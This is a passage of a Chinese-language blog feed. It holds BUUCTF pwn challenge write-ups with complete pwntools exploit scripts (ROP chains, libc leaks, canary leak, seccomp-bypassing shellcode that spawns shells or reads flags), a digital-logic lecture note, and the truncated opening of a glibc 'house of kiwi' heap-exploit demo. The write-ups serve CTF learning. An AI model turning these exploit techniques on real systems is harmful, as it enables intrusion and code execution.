class="line">io.sendlineafter(<span class="string">b&#x27;What is your name?&#x27;</span>, payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What do you want to say?&#x27;</span>, <span class="string">b&#x27;Hacked&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu035-jarvisoj-level4"><a href="#buu035-jarvisoj-level4" class="headerlink" title="buu035-jarvisoj_level4"></a>buu035-jarvisoj_level4</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26702</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">136</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">read = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read)</span><br><span class="line">base = read - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">136</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(sys)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu036-jarvisoj-level3-x64"><a href="#buu036-jarvisoj-level3-x64" class="headerlink" title="buu036-jarvisoj_level3_x64"></a>buu036-jarvisoj_level3_x64</h1><p>典型的ret2csu，与RopEmporium的最后一题利用方式高度一致。<br>注意第一个payload里面的0x600890保存的实际是sub rsp,8 ; add rsp,8 ; ret的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28787</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">poprsir15_ret = <span class="number">0x4006b1</span></span><br><span class="line">movrdxr13 = <span class="number">0x400690</span></span><br><span class="line">pop6_ret = <span class="number">0x4006aa</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">128</span> + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop6_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment"># rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># rbp</span></span><br><span class="line">payload += p64(<span class="number">0x600890</span>)<span class="comment"># r12</span></span><br><span class="line">payload += p64(<span class="number">8</span>)<span class="comment"># r13</span></span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;read&#x27;</span>])<span class="comment"># r14</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment"># r15</span></span><br><span class="line"></span><br><span class="line">payload += p64(movrdxr13)<span class="comment"># mov rdx, r13; mov rsi, r14; mov edi, r15d</span></span><br><span class="line"><span class="comment"># then call &#x27;pop rdi, ret&#x27;</span></span><br><span class="line"><span class="comment"># payload += p64(1)</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line"></span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># at this time, rdi = 1, rsi = addr(got[&#x27;read&#x27;]), rdx = 4</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">read = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read)</span><br><span class="line">base = read - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">128</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(sys)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu037-bjdctf-2020-babyrop2"><a href="#buu037-bjdctf-2020-babyrop2" class="headerlink" title="buu037-bjdctf_2020_babyrop2"></a>buu037-bjdctf_2020_babyrop2</h1><p>用gdb调试发现本题环境中所有函数的canary都相同，于是首先泄露canary然后栈溢出完事。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400993</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25313</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;I\&#x27;ll give u some gift to help u!\n&#x27;</span>, <span class="string">b&#x27;%7$llx&#x27;</span>)</span><br><span class="line"></span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Pull up your sword and tell me u story!\n&#x27;</span>, payload)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(sys)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu038-pwnable-orw"><a href="#buu038-pwnable-orw" class="headerlink" title="buu038-pwnable_orw"></a>buu038-pwnable_orw</h1><p>就是写入shellcode。这道题中有一个seccomp函数，在其中调用了两次prctl函数。具体的功能是禁止用户调用某些系统调用。下面是程序中的片段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v1 = <span class="number">12</span>;</span><br><span class="line">v2 = v3;</span><br><span class="line">prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br></pre></td></tr></table></figure><p>可以看到调用了两次prctl函数，第一个参数是option，表明具体的功能。<a href="https://elixir.bootlin.com/linux/v5.17.10/source/include/uapi/linux/prctl.h#L68">查询linux源码</a>可知，选项22和38分别代表以下意思：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_SECCOMP22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_NO_NEW_PRIVS38</span></span><br></pre></td></tr></table></figure><p>38表示禁止提权，而22则为设定SECCOMP保护。<br>当prctl第一个参数为22时，实际上调用了prctl_set_seccomp函数。找到其定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">prctl_set_seccomp</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> seccomp_mode, <span class="type">void</span> __user *filter)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> op;</span><br><span class="line"><span class="type">void</span> __user *uargs;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (seccomp_mode) &#123;</span><br><span class="line"><span class="keyword">case</span> SECCOMP_MODE_STRICT:</span><br><span class="line">op = SECCOMP_SET_MODE_STRICT;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Setting strict mode through prctl always ignored filter,</span></span><br><span class="line"><span class="comment"> * so make sure it is always NULL here to pass the internal</span></span><br><span class="line"><span class="comment"> * check in do_seccomp().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">uargs = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> SECCOMP_MODE_FILTER:</span><br><span class="line">op = SECCOMP_SET_MODE_FILTER;</span><br><span class="line">uargs = filter;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* prctl interface doesn&#x27;t have flags, so they are always zero. */</span></span><br><span class="line"><span class="keyword">return</span> do_seccomp(op, <span class="number">0</span>, uargs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中switch的宏定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_DISABLED0 <span class="comment">/* seccomp is not in use. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_STRICT1 <span class="comment">/* uses hard-coded filter. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_FILTER2 <span class="comment">/* uses user-supplied filter. */</span></span></span><br></pre></td></tr></table></figure><p>程序中传入的第二个参数为2，表示seccomp为过滤器模式。<br>之后查看源码发现传入的参数为一个结构体，内含长度与指令，指令用于seccomp沙箱。也就是说seccomp最终的执行方式是一种沙箱（vm）。直接手动分析可能较为困难，但有工具seccomp-tools帮助我们分析这些并输出结果（<a href="https://blog.csdn.net/am_03/article/details/119870152?ops_request_misc=&request_id=&biz_id=102&utm_term=seccomp-tools&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-119870152.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&spm=1018.2226.3001.4187">安装方法</a>）</p><p><img src="https://img-blog.csdnimg.cn/13b5d93da39d4bb889fea9cfd1fbdeaf.png"><br>可以看到输出把允许的系统调用用绿色标了出来，允许open、read、write。因此直接用open打开flag文件，读取若干字节到某个地址之后再写出来就可以了。这里选择将数据写在栈上，简单方便。</p><p>其中使用到了三个系统调用，32位x86的系统调用号以及使用的参数表在<a href="https://blog.csdn.net/Nashi_Ko/article/details/120288385?spm=1001.2014.3001.5506">这里</a>查询</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27084</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;push 0x0;&#x27;</span><span class="comment"># string ends</span></span><br><span class="line">payload += <span class="string">&#x27;push 0x67616c66;&#x27;</span><span class="comment"># string &#x27;flag&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;mov ebx,esp;&#x27;</span><span class="comment"># second argument of syscall &#x27;open&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;mov eax,5;&#x27;</span><span class="comment"># syscall code 5: open</span></span><br><span class="line">payload += <span class="string">&#x27;xor ecx,ecx;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;xor edx,edx;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;int 0x80;&#x27;</span><span class="comment"># open file &#x27;./flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">&#x27;mov eax,3;&#x27;</span><span class="comment"># syscall code 3: read</span></span><br><span class="line">payload += <span class="string">&#x27;mov ecx,ebx;&#x27;</span><span class="comment"># read file &#x27;./flag&#x27; to stack (ebx==esp now)</span></span><br><span class="line">payload += <span class="string">&#x27;mov ebx,3;&#x27;</span><span class="comment"># fd, 0 =&gt; stdin, 1 =&gt; stdout, 2 =&gt; stderr, &gt;=3 =&gt; others</span></span><br><span class="line">payload += <span class="string">&#x27;mov edx,0x100;&#x27;</span><span class="comment"># readsize, choose 0x100</span></span><br><span class="line">payload += <span class="string">&#x27;int 0x80;&#x27;</span><span class="comment"># read file &#x27;./flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">&#x27;mov eax,4;&#x27;</span><span class="comment"># syscall code 4: write</span></span><br><span class="line">payload += <span class="string">&#x27;mov ecx,esp;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;mov ebx,1;&#x27;</span><span class="comment"># second argument of syscall &#x27;write&#x27;: fd for stdout</span></span><br><span class="line">payload += <span class="string">&#x27;mov edx,0x100;&#x27;</span><span class="comment"># write size, choose 0x100</span></span><br><span class="line">payload += <span class="string">&#x27;int 0x80;&#x27;</span><span class="comment"># syscall code 4: write</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(asm(payload))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Give my your shellcode:&#x27;</span>, asm(payload))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数字逻辑 Chapter 6——异步时序逻辑电路</title>
      <link href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-6%E2%80%94%E2%80%94%E5%BC%82%E6%AD%A5%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/"/>
      <url>/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-6%E2%80%94%E2%80%94%E5%BC%82%E6%AD%A5%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="6-1-特点与分类"><a href="#6-1-特点与分类" class="headerlink" title="6.1 特点与分类"></a>6.1 特点与分类</h1><p>特点：电路中没有统一的同步时钟脉冲信号，电路状态的改变是外部输入信号变化直接作用的结果。<br>分类：根据电路结构和输入信号方式可以分为脉冲异步和电平异步；根据输出与输入的关系分为Moore和Mealy。</p><h1 id="6-2-脉冲异步时序逻辑电路"><a href="#6-2-脉冲异步时序逻辑电路" class="headerlink" title="6.2 脉冲异步时序逻辑电路"></a>6.2 脉冲异步时序逻辑电路</h1><h2 id="6-2-1-结构模型"><a href="#6-2-1-结构模型" class="headerlink" title="6.2.1 结构模型"></a>6.2.1 结构模型</h2><p>对输入信号的要求：</p><ul><li>输入信号为脉冲信号</li><li>输入脉冲的宽度必须保证触发器可靠翻转</li><li>输入脉冲的间隔，必须保证前一个脉冲引起的电路响应完全结束后，后一个脉冲才能到来</li><li><font color=red>不允许在两个或两个以上的输入端同时出现脉冲（必然有极短的时间差），因此在绘制真值表、状态表时需要注意，如果有多个信号输入，每一种情况只能有一个信号取值为1，其余全为0，减少了很多情况的讨论。也因此，异步时序的状态表有所不同，其次态的每一分栏均为其中一个变量取值为1，而不是三个变量的联合取值</font></li></ul><p>输出信号的形式：</p><ul><li>若电路结构为Mealy型，则输出为脉冲型</li><li>若电路结构为Moore型，则输出为电平型</li></ul><p>两种电路相同点：</p><ul><li>状态的改变都依赖于外加脉冲</li><li>存储元件均为触发器</li></ul><p>两种电路不同点：</p><ul><li>脉冲异步无外加的统一时钟脉冲</li><li>输入变量x为脉冲信号，由输入脉冲直接引起电路状态改变</li><li>由次态逻辑产生各触发器控制输入信号（Y1,Y2,…,Yr），而且还产生触发器的时钟控制信号（CLK1,CLK2,…,CLKr）</li></ul><h2 id="6-2-2-脉冲异步时序逻辑分析"><a href="#6-2-2-脉冲异步时序逻辑分析" class="headerlink" title="6.2.2 脉冲异步时序逻辑分析"></a>6.2.2 脉冲异步时序逻辑分析</h2><p>分析方法：与同步时序大致相同，同样采用状态表、状态图、时间图作为工具<br>注意：</p><ul><li>当存储元件采用钟控触发器时，对触发器的时钟控制端应该作为激励函数处理（仅当时钟端有脉冲作用时，才会根据和触发器的输入确定状态转移方向，否则触发器状态不变）</li><li>根据对输入的约束，分析时可以排除两个或两个以上输入端同时出现脉冲以及输入端无脉冲出现情况</li></ul><p>分析步骤：</p><ul><li>写出电路的输出函数和激励函数表达式</li><li>列出电路次态真值表或次态方程组</li><li>作出状态表和状态图</li><li>用文字描述电路的逻辑功能（必要时画出时间图）</li></ul><p>注意：<br>在脉冲异步的次态真值表中，↓表示下跳，即仅当时钟端有↓出现时，相应触发器状态才能有所变化，否则状态不变</p><h1 id="6-3-脉冲异步时序逻辑电路的设计"><a href="#6-3-脉冲异步时序逻辑电路的设计" class="headerlink" title="6.3 脉冲异步时序逻辑电路的设计"></a>6.3 脉冲异步时序逻辑电路的设计</h1><p>设计步骤与同步时序相同：</p><ul><li>形成原始状态图和原始状态表</li><li>状态化简，求出最小状态表</li><li>状态编码，得到二进制状态表</li><li>选定触发器类型，并求出激励函数和输出函数最简表达式</li><li>画出逻辑电路图</li></ul><p>下面是带有时钟信号的钟控触发器激励表<br><img src="https://img-blog.csdnimg.cn/74413ec817cc4904b613678fa2b70d3a.png"><br>在设计时对于状态表中与时钟端有关的变量，需要标明上升沿或下降沿以明确接线，如下图。<br><img src="https://img-blog.csdnimg.cn/afef66f9b55842dc9fefbe52c9f44508.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>glibc 2.35 pwn——house of kiwi示例程序</title>
      <link href="/2023/02/28/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-kiwi%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/"/>
      <url>/2023/02/28/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-kiwi%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>这是笔者写的house of kiwi示例程序，需要在ubuntu 22.04上编译运行。本程序改编自<a href="https://www.anquanke.com/post/id/235598">https://www.anquanke.com/post/id/235598</a>的demo程序，其中说明了house of kiwi的利用流程。house of kiwi的利用与house of emma类似，利用链更短，也更好理解一些。</p><p>若程序在运行过程中出现任何非预期情况，请及时与笔者联系，以便及时进行修改。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span 